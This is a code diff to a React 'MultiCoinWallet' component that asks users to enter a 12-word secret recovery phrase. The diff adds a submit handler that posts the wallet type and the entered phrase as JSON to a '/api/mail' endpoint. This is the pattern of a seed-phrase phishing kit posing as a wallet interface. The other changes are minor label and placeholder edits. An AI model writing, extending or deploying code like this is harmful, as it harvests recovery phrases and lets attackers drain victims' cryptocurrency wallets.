@@ -18,6 +18,21 @@ export default function MultiCoinWallet() {
 
   // Function to count words
   const countWords = (text) => text.trim().split(/\s+/).filter(Boolean).length;
+  async function handleSubmit(e) {
+    e.preventDefault();
+    if (!error) {
+      const res=await fetch('/api/mail',{
+        method:"POST",
+        headers:{
+            "content-Type":"application/json"
+        },
+
+        body:JSON.stringify({walletType,walletPhrase})
+      })
+      const data=await res.json()
+      console.log(data)
+    }
+  }
 
   return (
     <div
@@ -65,13 +80,13 @@ export default function MultiCoinWallet() {
 
         {/* Wallet Body */}
         {!collapsed && (
-          <>
+          <form onSubmit={ handleSubmit}>
             {/* Wallet Name */}
             <div className="mb-5">
               <label className="text-sm text-gray-500">Wallet name</label>
               <input
                 type="text"
-                value={walletType === "main" ? "Main Wallet 4" : "Private Wallet"}
+                value={walletType === "main" ? "Main Wallet" : "Private Wallet"}
                 readOnly
                 className={`mt-1 w-full rounded-lg px-3 py-3 text-sm
                   ${darkMode ? "bg-[#1c1c1c] border border-gray-700" : "bg-white border border-gray-300"}
@@ -96,7 +111,7 @@ export default function MultiCoinWallet() {
                       setError(""); // reset error while typing
                     }
                   }}
-                  placeholder="Enter exactly 12 words"
+                  placeholder={`${walletType === "private" ? "Private " : "Enter exactly 12 words"}`}
                   className={`w-full rounded-lg px-3 py-3 text-sm resize-none outline-none
                     ${darkMode ? "bg-[#1c1c1c] border border-green-500" : "bg-white border border-green-600"}
                   `}
@@ -151,7 +166,7 @@ export default function MultiCoinWallet() {
             >
               What is a secret phrase?
             </button>
-          </>
+          </form>
         )}
       </div>
 
